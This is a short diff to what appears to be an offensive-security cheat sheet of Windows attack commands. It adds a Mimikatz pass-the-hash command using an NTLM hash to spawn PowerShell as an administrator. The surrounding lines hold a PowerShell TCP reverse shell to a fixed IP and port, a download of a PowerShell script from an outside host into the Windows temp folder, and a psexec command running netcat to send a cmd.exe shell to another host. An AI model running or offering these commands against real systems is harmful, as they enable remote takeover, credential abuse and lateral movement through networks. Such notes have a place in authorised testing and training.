@@ -24,6 +24,12 @@ $ip='192.168.1.114';$port=1337;$client = New-Object System.Net.Sockets.TCPClient
 
  Invoke-WebRequest "http://10.10.15.58/hex.ps1" -OutFile "C:\Windows\TEMP\hex.ps1" 
  
+ #Ptt using mimikatz
+ 
+
+Invoke-Mimikatz -Command '"sekurlsa::pth /user:admin /domain:xyz.local /ntlm:ce03434e2f83b99704a631ae56e2146e /run:powershell.exe"'
+ 
+ 
  #psexec 
 ./ps.exe \\\localip -h -accepteula -u username -p password cmd /c 'C:\nc.exe 192.168.50.138 4444 -e cmd.exe'
  
